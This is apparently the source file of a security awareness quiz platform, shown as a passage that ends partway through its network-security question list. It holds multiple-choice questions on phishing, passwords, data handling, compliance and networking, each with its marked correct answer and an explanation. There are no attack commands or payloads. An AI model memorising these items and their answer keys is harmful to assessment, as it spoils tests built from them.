// Security Awareness Training & Quiz Platform
// Copyright (c) 2026 Darknode-Official. All rights reserved.

var esc = function(s) { return String(s == null ? '' : s).replace(/[&<>"']/g, function(c) { return ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[c]; }); };

var MODULES = [
  {
    id: 'passwords', name: 'Password Security', color: '#00e5ff',
    questions: [
      { q: 'Which password is the strongest?', opts: ['P@ssw0rd!', 'correct-horse-battery-staple', 'Admin123!', 'qwerty2024'], correct: 1, difficulty: 'beginner', explain: 'Long passphrases with multiple random words are stronger than short complex passwords. "correct-horse-battery-staple" has more entropy than "P@ssw0rd!" despite lacking special characters.' },
      { q: 'Your company requires password changes every 90 days. According to NIST SP 800-63B, this is:', opts: ['Best practice', 'No longer recommended', 'Required by law', 'Only for admin accounts'], correct: 1, difficulty: 'intermediate', explain: 'NIST no longer recommends periodic password rotation. It leads to weaker passwords (users increment numbers) and reduces security. Only change passwords when compromise is suspected.' },
      { q: 'A colleague asks for your password to finish a report while you are out sick. You should:', opts: ['Share it -- they need to finish the work', 'Share it but change it when you return', 'Refuse and suggest they contact IT', 'Email it to them encrypted'], correct: 2, difficulty: 'beginner', explain: 'Never share credentials. If a colleague needs access, IT can provide temporary access through proper channels. Shared passwords break audit trails and accountability.' },
      { q: 'Which MFA method is most resistant to phishing?', opts: ['SMS codes', 'Email codes', 'Authenticator app (TOTP)', 'FIDO2/WebAuthn hardware key'], correct: 3, difficulty: 'intermediate', explain: 'FIDO2/WebAuthn keys are phishing-resistant because they cryptographically verify the website domain. SMS, email, and TOTP codes can all be intercepted by real-time phishing proxies (e.g., Evilginx2).' },
      { q: 'You discover your password "Summer2024!" appeared in a data breach. What should you do?', opts: ['Nothing -- the breach was at another company', 'Change it only on the breached site', 'Change it everywhere you used it', 'Delete the breached account'], correct: 2, difficulty: 'beginner', explain: 'Credential stuffing attacks try breached passwords across many sites. Change it everywhere, and start using unique passwords per site with a password manager.' },
      { q: 'Which is the safest way to store passwords?', opts: ['Browser built-in password manager', 'A spreadsheet on your desktop', 'A sticky note in your desk drawer', 'A dedicated password manager (1Password, Bitwarden)'], correct: 3, difficulty: 'beginner', explain: 'Dedicated password managers encrypt your vault with a master password, support MFA, and work across devices. Browser managers are acceptable but offer less security than dedicated tools. Never use spreadsheets or notes.' },
      { q: 'An attacker has your NTLM hash. What can they do WITHOUT cracking it?', opts: ['Nothing -- hashes are useless without the password', 'Log in to Windows systems using Pass-the-Hash', 'Only offline brute force attacks', 'Access only the specific file it was stored in'], correct: 1, difficulty: 'advanced', explain: 'Pass-the-Hash (PtH) attacks use the NTLM hash directly for authentication without knowing the plaintext password. This is why credential theft is so dangerous even with strong passwords.' },
      { q: 'What is credential stuffing?', opts: ['Guessing passwords by trying common ones', 'Using breached username/password pairs across other sites', 'Brute-forcing a single account', 'Social engineering to get passwords'], correct: 1, difficulty: 'beginner', explain: 'Credential stuffing uses leaked credentials from one breach to log into other sites, exploiting password reuse. It differs from brute force in that it uses known-valid credentials.' },
      { q: 'Your company implements passwordless authentication. What replaces the password?', opts: ['Biometrics only', 'Security questions', 'FIDO2 key or device biometric + cryptographic proof', 'Longer passwords'], correct: 2, difficulty: 'advanced', explain: 'Passwordless auth uses FIDO2/WebAuthn -- your device generates a cryptographic key pair, authenticates via biometric or PIN, and proves identity without transmitting a secret. No password to phish or stuff.' },
      { q: 'Which attack does MFA NOT protect against?', opts: ['Brute force', 'Credential stuffing', 'Adversary-in-the-middle (AitM) proxy phishing', 'Password spraying'], correct: 2, difficulty: 'advanced', explain: 'AitM phishing (Evilginx2, Modlishka) proxies the real login page, captures both the password AND the MFA token/session cookie in real-time. Only phishing-resistant MFA (FIDO2) stops this.' },
    ],
  },
  {
    id: 'phishing', name: 'Phishing Recognition', color: '#ff1744',
    questions: [
      { q: 'An email from "IT-Support@yourcompany.com" asks you to click a link to verify your credentials. The link goes to "yourcompany-verify.com". This is:', opts: ['Legitimate -- it has the company name', 'Suspicious -- the domain is different from the company', 'Safe if it has HTTPS', 'Only dangerous if you enter a password'], correct: 1, difficulty: 'beginner', explain: 'The domain "yourcompany-verify.com" is NOT the same as "yourcompany.com". Attackers register lookalike domains. Always check the actual domain, not just whether it contains familiar words.' },
      { q: 'Which of these sender addresses is most likely spoofed?', opts: ['john.smith@company.com', 'john.smith@cornpany.com', 'jsmith@company.com', 'john.s@company.com'], correct: 1, difficulty: 'beginner', explain: '"cornpany.com" uses an "rn" that looks like "m" -- a classic homoglyph attack. Always carefully inspect domains, especially in unexpected emails requesting action.' },
      { q: 'You receive an email from your CEO asking you to urgently wire $50,000. The email says "Do not discuss this with anyone." You should:', opts: ['Comply -- the CEO has authority', 'Forward it to your personal email to review later', 'Call the CEO directly on their known phone number to verify', 'Reply to the email asking for confirmation'], correct: 2, difficulty: 'intermediate', explain: 'This is a classic Business Email Compromise (BEC). Never act on urgent financial requests via email alone. Verify through a separate channel (phone call to a known number). Do not reply to the email -- the reply goes to the attacker.' },
      { q: 'A phishing email has passed your email gateway filters. What is the most likely reason?', opts: ['The filters are broken', 'The email used a newly registered domain with valid SPF/DKIM', 'Phishing emails always bypass filters', 'The attacker is inside the network'], correct: 1, difficulty: 'intermediate', explain: 'Attackers use brand-new domains with properly configured SPF, DKIM, and DMARC to pass technical checks. No email filter catches 100% of phishing. Human judgment is the last line of defense.' },
      { q: 'You clicked a suspicious link but did not enter any information. What should you do?', opts: ['Nothing -- you did not enter data', 'Report it to IT/security immediately', 'Clear your browser cache and forget about it', 'Only worry if your antivirus alerts'], correct: 1, difficulty: 'beginner', explain: 'Clicking a link can trigger drive-by downloads, browser exploits, or install tracking pixels. Always report even if you think nothing happened -- your security team can check for compromise.' },
      { q: 'Which is the safest way to access a link from a suspicious email?', opts: ['Click it in a private/incognito window', 'Copy-paste it into your browser', 'Type the known URL manually in your browser', 'Click it on your phone instead'], correct: 2, difficulty: 'beginner', explain: 'Never interact with suspicious links. Navigate to the site manually using a URL you know is correct. Incognito mode does not protect against malware, and phones are equally vulnerable.' },
      { q: 'Your colleague sends you a Google Drive link to a shared document, but the email seems slightly off. What is the safest action?', opts: ['Open it -- Google Drive is safe', 'Message your colleague through a different channel to verify', 'Open it in incognito mode', 'Forward it to IT without opening'], correct: 1, difficulty: 'intermediate', explain: 'Verify through a different channel (Slack, phone, in person). Attackers compromise accounts and send phishing links from real colleague accounts. A "slightly off" email is a red flag even from known contacts.' },
      { q: 'What makes spear phishing more dangerous than regular phishing?', opts: ['It uses more advanced malware', 'It is personalized with information about the target', 'It bypasses all security tools', 'It can only target executives'], correct: 1, difficulty: 'beginner', explain: 'Spear phishing targets specific individuals using personal details (name, role, projects, colleagues) gathered from LinkedIn, social media, and corporate websites, making it much more convincing.' },
      { q: 'You receive a voicemail from "Microsoft Support" saying your computer is compromised. They leave a callback number. You should:', opts: ['Call back immediately', 'Call Microsoft official support instead', 'Ignore it -- Microsoft does not cold-call users', 'Forward the message to your IT team'], correct: 2, difficulty: 'beginner', explain: 'Microsoft, Apple, and the IRS never make unsolicited calls about computer problems. This is vishing (voice phishing). If concerned, contact the company through their official website number.' },
      { q: 'An email contains a QR code asking you to "verify your account." This attack is called:', opts: ['Smishing', 'Quishing', 'Vishing', 'Whaling'], correct: 1, difficulty: 'intermediate', explain: 'Quishing (QR phishing) uses QR codes to bypass email link scanners. The QR code leads to a phishing page, but email security tools cannot analyze the URL embedded in an image.' },
    ],
  },
  {
    id: 'data', name: 'Data Handling', color: '#ffd600',
    questions: [
      { q: 'You need to send sensitive customer data to an external auditor. The safest method is:', opts: ['Email attachment', 'Encrypted file via secure file transfer', 'USB drive sent by mail', 'Printing and faxing'], correct: 1, difficulty: 'beginner', explain: 'Use encrypted file transfer (SFTP, encrypted cloud sharing with access controls). Email attachments travel in plaintext through multiple servers. USB drives can be lost. Faxes can be intercepted.' },
      { q: 'You find a USB drive in the parking lot. You should:', opts: ['Plug it in to find the owner', 'Turn it in to security/IT', 'Plug it into an isolated computer', 'Throw it away'], correct: 1, difficulty: 'beginner', explain: 'USB drops are a real attack vector (used by APT groups). Malicious USBs can execute code the moment they are plugged in (USB Rubber Ducky, BadUSB). Never plug unknown devices into any computer.' },
      { q: 'GDPR requires breach notification within:', opts: ['24 hours', '72 hours', '7 days', '30 days'], correct: 1, difficulty: 'intermediate', explain: 'GDPR Article 33 requires notification to the supervisory authority within 72 hours of becoming aware of a personal data breach. Affected individuals must also be notified without undue delay if the breach poses high risk.' },
      { q: 'Which data classification level requires encryption at rest?', opts: ['Public', 'Internal', 'Confidential', 'All of the above'], correct: 2, difficulty: 'intermediate', explain: 'Confidential and Restricted data must be encrypted at rest. Public data does not need encryption. Internal data may require it depending on policy. Most frameworks require encryption for sensitive data.' },
      { q: 'Your laptop is stolen from your car. It has full disk encryption enabled. What is the impact?', opts: ['Catastrophic -- all data is compromised', 'Moderate -- encryption can be broken', 'Low -- data is protected by encryption', 'None -- the thief cannot turn it on'], correct: 2, difficulty: 'beginner', explain: 'Full disk encryption (BitLocker, FileVault) protects data at rest. Without the password/key, the data is inaccessible. The hardware is lost, but the data breach impact is minimal -- which matters for regulatory notification requirements.' },
      { q: 'A colleague accidentally emails a spreadsheet of employee SSNs to an external client. This is:', opts: ['Not a big deal -- just ask them to delete it', 'A data breach requiring incident response', 'Only a problem if the client is malicious', 'Handled by the email recall feature'], correct: 1, difficulty: 'beginner', explain: 'Unauthorized disclosure of PII (especially SSNs) constitutes a data breach. Initiate incident response, notify the privacy/legal team, contact the recipient for deletion confirmation, and determine regulatory notification requirements.' },
      { q: 'A vendor requests a full copy of your customer database for "integration testing." You should:', opts: ['Send it -- they need real data to test', 'Provide anonymized or synthetic test data', 'Send it with a signed NDA', 'Send only the columns they need'], correct: 1, difficulty: 'intermediate', explain: 'Never share production data for testing. Provide anonymized, pseudonymized, or synthetic datasets. Real data in vendor environments multiplies breach surface and may violate privacy regulations.' },
      { q: 'You are disposing of old hard drives that contained confidential data. The correct method is:', opts: ['Format the drive and recycle', 'Delete all files then discard', 'Physical destruction or certified degaussing', 'Overwrite with zeros once'], correct: 2, difficulty: 'intermediate', explain: 'Formatting and deletion leave data recoverable with forensic tools. NIST SP 800-88 recommends physical destruction (shredding) or cryptographic erasure for confidential data. A single zero-pass may leave recoverable traces on older magnetic media.' },
    ],
  },
  {
    id: 'physical', name: 'Physical Security', color: '#00e676',
    questions: [
      { q: 'Someone in a delivery uniform asks you to hold the door open to the secure area. You should:', opts: ['Let them in -- they have a uniform', 'Ask them to badge in themselves or call their contact', 'Hold the door and report it later', 'Ignore them'], correct: 1, difficulty: 'beginner', explain: 'Tailgating/piggybacking is a common physical security attack. Uniforms can be faked. Politely ask them to badge in or contact their internal sponsor. Never hold secure doors for unverified individuals.' },
      { q: 'You are leaving for the day. Which is the best practice for your workstation?', opts: ['Leave it on for updates', 'Lock the screen (Win+L or Cmd+Ctrl+Q)', 'Log out completely', 'Close the laptop lid'], correct: 1, difficulty: 'beginner', explain: 'Lock your screen at minimum. Logging out is better for shared workstations. The key is preventing unauthorized access -- an unlocked workstation is an easy target for insider threats and unauthorized access.' },
      { q: 'You notice an unfamiliar person photographing your company whiteboard with project details. You should:', opts: ['Ignore it -- they might be a new employee', 'Politely ask who they are and who invited them', 'Call security immediately', 'Take a photo of them'], correct: 1, difficulty: 'intermediate', explain: 'This could be corporate espionage or social engineering reconnaissance. Politely verify their identity and purpose. If they cannot identify themselves, contact security. Whiteboards often contain sensitive architecture and strategy information.' },
      { q: 'What is "clean desk policy"?', opts: ['Keeping your desk physically clean', 'Locking away all sensitive documents and devices when unattended', 'A rule about food at desks', 'Clearing your desk when you quit'], correct: 1, difficulty: 'beginner', explain: 'Clean desk policy requires removing all sensitive materials (documents, sticky notes with passwords, USB drives, printed reports) from desks when unattended. It prevents casual observation, photography, and document theft.' },
      { q: 'A "penetration tester" arrives unannounced and says management hired them to test building security. You should:', opts: ['Let them proceed -- pentesters have authorization', 'Verify with management or the security office before granting access', 'Ask for their ID and let them in', 'Tell them to come back another day'], correct: 1, difficulty: 'intermediate', explain: 'Legitimate penetration testers carry a signed authorization letter (scope, dates, contact). Always verify with your management or security office. Attackers commonly impersonate pentesters to gain physical access.' },
      { q: 'An employee props open a fire exit with a wedge for convenience. The security risk is:', opts: ['Minimal -- fire exits only open from inside', 'Significant -- it bypasses access controls and enables unauthorized entry', 'Only a fire code violation, not a security issue', 'Acceptable if the area has cameras'], correct: 1, difficulty: 'beginner', explain: 'Propped doors bypass all access control systems (badge readers, alarms). Even with cameras, an intruder is inside before anyone reviews footage. Fire exits should only be used in emergencies and must remain closed.' },
    ],
  },
  {
    id: 'remote', name: 'Remote Work Security', color: '#d500f9',
    questions: [
      { q: 'You are working from a coffee shop on public WiFi. The safest approach is:', opts: ['Only visit HTTPS sites', 'Use the company VPN for all traffic', 'Use your phone hotspot instead', 'Both B and C are acceptable'], correct: 3, difficulty: 'beginner', explain: 'Both VPN and phone hotspot avoid the public WiFi risk. VPN encrypts all traffic through the corporate network. A phone hotspot uses cellular data which is harder to intercept than WiFi. HTTPS alone does not protect DNS queries or all traffic.' },
      { q: 'Your home router still uses the default admin password. This is a risk because:', opts: ['It is not a risk -- home routers are safe', 'Attackers on your network can change DNS settings to redirect you to phishing sites', 'It only matters if you host a server', 'Default passwords are strong enough'], correct: 1, difficulty: 'intermediate', explain: 'Default router credentials are publicly known. An attacker (via malware or a compromised IoT device) can change DNS to redirect banking/corporate URLs to phishing sites, intercept traffic, or pivot into your network.' },
      { q: 'Your smart home device (Alexa, Google Home) is in your home office. During a confidential call, you should:', opts: ['Mute the device or move it', 'It does not matter -- it only listens for wake words', 'Turn off WiFi on the device', 'Cover the microphone'], correct: 0, difficulty: 'intermediate', explain: 'Smart speakers continuously listen for wake words, and there have been documented cases of accidental recordings. For confidential calls, mute the device or move it out of earshot. Some organizations prohibit smart speakers in home offices.' },
      { q: 'A family member wants to use your work laptop to browse the internet. You should:', opts: ['Allow it -- you trust them', 'Create a separate user account for them', 'Decline -- work devices are for work only', 'Allow it but in incognito mode'], correct: 2, difficulty: 'beginner', explain: 'Work devices contain corporate data, VPN credentials, and security tools. Family members may inadvertently install malware, visit compromised sites, or violate data handling policies. Use personal devices for personal activities.' },
      { q: 'You need to join a video call but your webcam shows your home whiteboard with client project notes. You should:', opts: ['It is fine -- attendees are colleagues', 'Use a virtual background or blur to hide the whiteboard', 'Cover the whiteboard before the call', 'Both B and C are good options'], correct: 3, difficulty: 'beginner', explain: 'Client project details visible in video calls can be captured via screenshots or recordings. Use virtual backgrounds, blur, or physically cover sensitive materials. This is especially critical for calls with external participants.' },
      { q: 'Your company issues you a hardware VPN token, but you find it inconvenient. You should:', opts: ['Stop using VPN for low-risk tasks', 'Ask IT for a software alternative', 'Share a token with a co-worker to reduce cost', 'Use a free VPN service instead'], correct: 1, difficulty: 'intermediate', explain: 'Hardware tokens exist for security reasons, but IT may offer approved software alternatives (certificate-based VPN, SSO-integrated solutions). Never share tokens (breaks authentication integrity) or use unapproved VPNs (may log your traffic).' },
    ],
  },
  {
    id: 'social', name: 'Social Media Safety', color: '#ff9100',
    questions: [
      { q: 'An attacker can use your social media to craft a spear phishing email. Which post gives them the most useful information?', opts: ['A vacation photo', 'Your new job title and team at a specific company', 'A meme you shared', 'A photo of your pet'], correct: 1, difficulty: 'beginner', explain: 'Job titles, team names, and company details help attackers impersonate colleagues, reference real projects, and craft convincing pretexts. Your role information is the most valuable OSINT for spear phishing.' },
      { q: 'Your LinkedIn shows you just started a new role. An attacker might:', opts: ['Send a fake onboarding email from "HR"', 'Nothing -- LinkedIn is safe', 'Only target you if you are an executive', 'Wait until you have been there longer'], correct: 0, difficulty: 'intermediate', explain: 'New employees are prime targets -- they do not yet know internal procedures, faces, or communication styles. Attackers send fake onboarding/setup emails knowing the new hire cannot verify whether the request is normal.' },
      { q: 'You post a photo of your work badge for your first-day-at-work celebration. The risk is:', opts: ['No risk -- badges cannot be cloned from photos', 'Attackers can clone the badge design and create physical duplicates', 'Only risky if the badge number is visible', 'The company logo is already public'], correct: 1, difficulty: 'intermediate', explain: 'Badge photos reveal the badge format, color, logo placement, and potentially the barcode/QR/proximity card number. Attackers use this to create convincing physical clones for tailgating attacks.' },
      { q: 'A stranger on LinkedIn claiming to be a recruiter asks you to download a "job description PDF." You should:', opts: ['Download it -- recruiters always send PDFs', 'Open it on your phone instead of your work laptop', 'Verify the recruiter profile and company before opening anything', 'Scan it with antivirus then open'], correct: 2, difficulty: 'beginner', explain: 'Fake recruiter profiles are a common attack vector (used by Lazarus Group). Verify the recruiter exists on the company website, has a legitimate profile history, and mutual connections. Malicious PDFs can exploit reader vulnerabilities.' },
      { q: 'Your company is about to announce a major acquisition. You mention it casually in a private Facebook group. The risk is:', opts: ['None -- the group is private', 'Potential insider trading liability and SEC violations', 'Only risky if a journalist is in the group', 'Private groups are encrypted and safe'], correct: 1, difficulty: 'advanced', explain: 'Material non-public information shared anywhere -- even "private" groups -- can trigger insider trading investigations. Private groups are not truly private (screenshots, data breaches, subpoenas). SEC enforcement does not distinguish between public and private social media.' },
    ],
  },
  {
    id: 'incident', name: 'Incident Reporting', color: '#00b0ff',
    questions: [
      { q: 'You notice unusual login attempts on your account at 3 AM. You should:', opts: ['Change your password and forget about it', 'Report it to your security team immediately', 'Wait to see if it happens again', 'Post about it on social media'], correct: 1, difficulty: 'beginner', explain: 'Unusual login attempts may indicate credential compromise. Report immediately -- your security team can correlate it with other indicators (are other accounts targeted? is it a brute force campaign?) and take protective action.' },
      { q: 'You accidentally sent an email with customer data to the wrong external address. The first thing you should do is:', opts: ['Try to recall the email', 'Delete the email from your sent folder', 'Report it as a data incident', 'Email the recipient asking them to delete it'], correct: 2, difficulty: 'beginner', explain: 'Report to your security/privacy team first. They will guide next steps including contacting the recipient, assessing regulatory notification requirements, and documenting the incident. Do not try to handle it alone.' },
      { q: 'What information should you include when reporting a security incident?', opts: ['Just say "something suspicious happened"', 'What happened, when, affected systems, any actions you took', 'Only report if you are sure it is real', 'Forward the suspicious email to your personal account for evidence'], correct: 1, difficulty: 'beginner', explain: 'Good incident reports include: what happened, when you noticed it, which systems/accounts are affected, what you did (clicked link, opened attachment, etc.), and any error messages or screenshots. Never forward to personal email.' },
      { q: 'Your antivirus quarantined a file you downloaded from a vendor. You should:', opts: ['Restore it -- the vendor is trusted', 'Report it to IT and wait for analysis', 'Disable antivirus and re-download', 'It was a false positive, ignore it'], correct: 1, difficulty: 'intermediate', explain: 'Even trusted vendors can be compromised (supply chain attacks). Report the quarantine to IT for analysis. They can verify whether the file is legitimate or if the vendor has been compromised (as happened with SolarWinds, Kaseya, 3CX).' },
      { q: 'During incident response, your manager asks you to delete logs to "avoid bad press." You should:', opts: ['Comply -- management has authority over data', 'Refuse and report the request to legal/compliance', 'Delete the logs but keep a personal copy', 'Ask a colleague for a second opinion'], correct: 1, difficulty: 'advanced', explain: 'Destroying evidence during an investigation is illegal in many jurisdictions (obstruction, spoliation). Incident response logs may be required by regulators (GDPR, HIPAA, SOX). Report the request to legal/compliance or your ethics hotline.' },
    ],
  },
  {
    id: 'compliance', name: 'Compliance Basics', color: '#7c5cff',
    questions: [
      { q: 'Under GDPR, which is NOT a right of data subjects?', opts: ['Right to erasure (right to be forgotten)', 'Right to data portability', 'Right to unlimited free storage', 'Right to access their data'], correct: 2, difficulty: 'intermediate', explain: 'GDPR grants rights to access, rectification, erasure, portability, restriction of processing, and objection. There is no right to unlimited storage -- organizations can set reasonable retention periods.' },
      { q: 'HIPAA protects:', opts: ['All personal data', 'Protected Health Information (PHI)', 'Financial records', 'Intellectual property'], correct: 1, difficulty: 'beginner', explain: 'HIPAA specifically protects Protected Health Information (PHI) -- individually identifiable health information held by covered entities (healthcare providers, insurers, clearinghouses) and their business associates.' },
      { q: 'PCI DSS applies to organizations that:', opts: ['Store, process, or transmit cardholder data', 'Have more than 100 employees', 'Are publicly traded', 'Operate in the EU'], correct: 0, difficulty: 'intermediate', explain: 'PCI DSS applies to ANY organization that stores, processes, or transmits credit/debit card data, regardless of size. Even a small business with a card reader must comply with applicable PCI DSS requirements.' },
      { q: 'What is the penalty for GDPR non-compliance?', opts: ['Warning letter only', 'Up to $1 million', 'Up to 4% of annual global revenue or 20M EUR', 'Criminal prosecution only'], correct: 2, difficulty: 'intermediate', explain: 'GDPR fines can reach 4% of annual worldwide turnover or 20 million EUR, whichever is greater. This has been enforced -- Meta was fined 1.2B EUR, Amazon 746M EUR. Additionally, organizations face reputational damage and lawsuits.' },
      { q: 'SOC 2 Type II differs from Type I in that it:', opts: ['Covers more trust service criteria', 'Tests controls over a period of time, not just a point in time', 'Is only required for public companies', 'Requires third-party penetration testing'], correct: 1, difficulty: 'advanced', explain: 'SOC 2 Type I evaluates control design at a single point in time. Type II evaluates control design AND operating effectiveness over a minimum 6-month period. Type II is considered more rigorous and is preferred by enterprise customers.' },
    ],
  },
];

// Practitioner track: technical questions for security staff, grouped by domain. Kept apart from
// MODULES so the awareness certificate and averages only cover the awareness modules.
var PRACTITIONER = [
  {
    id: 'pr-network', name: 'Network Security', color: '#38bdf8',
    questions: [
      { q: 'What is the primary purpose of ARP (Address Resolution Protocol)?', opts: ['Resolve domain names to IP addresses', 'Map IP addresses to MAC addresses', 'Encrypt network traffic', 'Authenticate users on a network'], correct: 1, difficulty: 'beginner', explain: 'ARP maps IP addresses to MAC addresses on a local network segment. When a device knows the IP but not the MAC address of a destination on the same subnet, it broadcasts an ARP request. ARP has no authentication mechanism, making it vulnerable to ARP spoofing/poisoning attacks. Reference: RFC 826.' },
      { q: 'Which port does HTTPS use by default?', opts: ['80', '8080', '443', '8443'], correct: 2, difficulty: 'beginner', explain: 'HTTPS uses TCP port 443 by default. HTTP uses port 80. Ports 8080 and 8443 are common alternative ports for HTTP and HTTPS respectively, often used by web application servers and proxies. Reference: RFC 2818.' },
      { q: 'What type of attack involves flooding a network with ICMP echo requests?', opts: ['SYN flood', 'Smurf attack', 'Ping of Death', 'Teardrop attack'], correct: 1, difficulty: 'intermediate', explain: 'A Smurf attack floods the target by sending ICMP echo requests to a network\'s broadcast address with the source IP spoofed to the victim\'s IP. All hosts on the network reply to the victim, amplifying the traffic. Modern networks typically block directed broadcasts to prevent this. Reference: CVE-1999-0513.' },
      { q: 'What does a stateful firewall track that a packet filter does not?', opts: ['Source IP addresses', 'Destination ports', 'Connection state and context', 'Packet payload content'], correct: 2, difficulty: 'intermediate', explain: 'Stateful firewalls maintain a state table tracking the full context of active connections — including TCP sequence numbers, flags, and connection phases. This allows them to make decisions based on whether a packet is part of an established connection, unlike simple packet filters that evaluate each packet independently. Reference: NIST SP 800-41.' },
      { q: 'In a VLAN hopping attack using switch spoofing, what does the attacker configure their port as?', opts: ['An access port on the target VLAN', 'A trunk port using DTP negotiation', 'A mirror/SPAN port', 'A native VLAN port'], correct: 1, difficulty: 'advanced', explain: 'In switch spoofing, the attacker configures their interface to negotiate a trunk link using Dynamic Trunking Protocol (DTP). Once trunking is established, the attacker can send 802.1Q-tagged frames to access any VLAN. Mitigation: disable DTP on all access ports with \'switchport mode access\' and \'switchport nonegotiate\'. Reference: CISCO VLAN Security.' },
      { q: 'What is the main difference between IDS and IPS?', opts: ['IDS is hardware, IPS is software', 'IDS detects threats, IPS prevents them inline', 'IDS works at Layer 7, IPS at Layer 3', 'IDS uses signatures, IPS uses anomalies'], correct: 1, difficulty: 'beginner', explain: 'An Intrusion Detection System (IDS) passively monitors traffic and generates alerts but does not block attacks. An Intrusion Prevention System (IPS) sits inline in the traffic flow and can actively block or drop malicious packets. IPS introduces latency since all traffic must pass through it, but provides active defense. Reference: NIST SP 800-94.' },
      { q: 'Which protocol is vulnerable to BGP hijacking?', opts: ['DNS', 'OSPF', 'BGP', 'RIP'], correct: 2, difficulty: 'advanced', explain: 'BGP (Border Gateway Protocol) is vulnerable to route hijacking because it relies on trust between autonomous systems without built-in authentication. An attacker can announce ownership of IP prefixes they don\'t own, redirecting internet traffic through their network for interception or denial of service. RPKI (Resource Public Key Infrastructure) is the primary mitigation. Reference: RFC 7454.' },
      { q: 'What does the TTL field in an IP packet indicate?', opts: ['Time in seconds before packet expires', 'Maximum number of router hops', 'Total transmission latency', 'TCP timeout value'], correct: 1, difficulty: 'beginner', explain: 'TTL (Time To Live) specifies the maximum number of router hops a packet can traverse before being discarded. Each router decrements the TTL by 1. When TTL reaches 0, the packet is dropped and an ICMP Time Exceeded message is sent back. This prevents packets from looping indefinitely. Traceroute exploits this mechanism by sending packets with incrementally increasing TTL values. Reference: RFC 791.' },
      { q: 'In a DNS amplification DDoS attack, what record type is most commonly abused?', opts: ['A record', 'CNAME record', 'ANY or TXT record', 'MX record'], correct: 2, difficulty: 'intermediate', explain: 'DNS amplification attacks typically query for ANY or TXT records because they produce the largest responses relative to the query size. A small 60-byte query can generate a 4000+ byte response, achieving an amplification factor of ~50x. The attacker spoofs the source IP to the victim\'s address, and the DNS server sends the large response to the victim. Reference: US-CERT TA13-088A.' },
      { q: 'What is the purpose of 802.1X in network security?', opts: ['VLAN tagging', 'Port-based network access control', 'Wireless encryption', 'Link aggregation'], correct: 1, difficulty: 'intermediate', explain: 'IEEE 802.1X provides port-based network access control (PNAC). It authenticates devices attempting to connect to a LAN or WLAN using EAP (Extensible Authentication Protocol) before granting network access. It involves three parties: the supplicant (client), the authenticator (switch/AP), and the authentication server (RADIUS). Unauthenticated ports only allow EAP traffic. Reference: IEEE 802.1X-2020.' },
      { q: 'What is a SYN flood attack?', opts: ['Sending malformed SYN packets to crash a server', 'Overwhelming a server with half-open TCP connections', 'Flooding a network with SYN-ACK packets', 'Injecting fake SYN cookies'], correct: 1, difficulty: 'beginner', explain: 'A SYN flood attack exploits the TCP three-way handshake. The attacker sends many SYN packets with spoofed source IPs. The server responds with SYN-ACK and allocates resources for each half-open connection, waiting for an ACK that never comes. This exhausts the server\'s connection table. SYN cookies are a defense that avoids allocating resources until the handshake completes. Reference: RFC 4987.' },
      { q: 'What protocol does Kerberos use for transport?', opts: ['TCP port 88', 'UDP port 88 (primarily)', 'TCP port 389', 'UDP port 636'], correct: 1, difficulty: 'intermediate', explain: 'Kerberos primarily uses UDP port 88 for authentication exchanges, with TCP port 88 as fallback for larger messages. Kerberos provides mutual authentication using tickets issued by a Key Distribution Center (KDC). It is the default authentication protocol in Active Directory environments. Reference: RFC 4120.' },
      { q: 'What is the purpose of network segmentation?', opts: ['Increase bandwidth', 'Reduce collision domains', 'Limit the blast radius of security breaches', 'Improve DNS resolution speed'], correct: 2, difficulty: 'beginner', explain: 'Network segmentation divides a network into isolated segments to limit the impact of a security breach. If an attacker compromises one segment, they cannot easily move to other segments. This is a fundamental defense-in-depth strategy. Implementation methods include VLANs, firewalls, ACLs, and micro-segmentation. Reference: NIST SP 800-125B.' },
      { q: 'Which of the following is NOT a valid TCP flag?', opts: ['URG (Urgent)', 'ECE (ECN-Echo)', 'REQ (Request)', 'PSH (Push)'], correct: 2, difficulty: 'intermediate', explain: 'REQ is not a valid TCP flag. The valid TCP flags are: SYN (Synchronize), ACK (Acknowledge), FIN (Finish), RST (Reset), PSH (Push), URG (Urgent), ECE (ECN-Echo), CWR (Congestion Window Reduced), and NS (Nonce Sum). These 9 flags each occupy 1 bit in the TCP header. Reference: RFC 9293.' },
      { q: 'What does NAT (Network Address Translation) primarily provide?', opts: ['Encryption of network traffic', 'Translation between private and public IP addresses', 'Load balancing across servers', 'DNS resolution caching'], correct: 1, difficulty: 'beginner', explain: 'NAT translates private IP addresses (RFC 1918: 10.x.x.x, 172.16-31.x.x, 192.168.x.x) to public IP addresses for internet communication. While NAT provides a limited form of security by hiding internal IP addresses, it was designed primarily to conserve IPv4 address space. PAT (Port Address Translation) allows multiple internal hosts to share a single public IP. Reference: RFC 3022.' },
      { q: 'What attack exploits the lack of authentication in DHCP?', opts: ['DHCP starvation', 'DNS poisoning', 'ARP spoofing', 'IP fragmentation'], correct: 0, difficulty: 'intermediate', explain: 'DHCP starvation attacks exploit the fact that DHCP has no built-in authentication. The attacker floods the DHCP server with requests using spoofed MAC addresses, exhausting the available IP address pool. This prevents legitimate clients from obtaining IP addresses. Often combined with a rogue DHCP server to perform man-in-the-middle attacks. DHCP snooping on switches is the primary defense. Reference: CISCO DHCP Snooping.' },
      { q: 'In the OSI model, at which layer does TLS/SSL operate?', opts: ['Layer 3 (Network)', 'Layer 4 (Transport)', 'Between Layer 4 and Layer 7 (Session/Presentation)', 'Layer 7 (Application)'], correct: 2, difficulty: 'intermediate', explain: 'TLS/SSL doesn\'t fit neatly into a single OSI layer. It operates above the transport layer (Layer 4/TCP) but below the application layer (Layer 7), roughly corresponding to the Session and Presentation layers (Layers 5-6). It provides encryption, authentication, and integrity for data transmitted between applications over TCP. Reference: RFC 8446.' },
      { q: 'What is the purpose of a honeypot in network security?', opts: ['Filter malicious traffic', 'Attract and analyze attacker behavior', 'Encrypt sensitive data at rest', 'Load balance incoming connections'], correct: 1, difficulty: 'beginner', explain: 'A honeypot is a decoy system designed to attract attackers and study their methods, tools, and tactics. It has no legitimate production purpose, so any interaction with it is suspicious by definition. Honeypots can be low-interaction (simulating services) or high-interaction (full systems). They provide valuable threat intelligence but must be carefully isolated to prevent attackers from using them as pivot points. Reference: NIST SP 800-83.' },
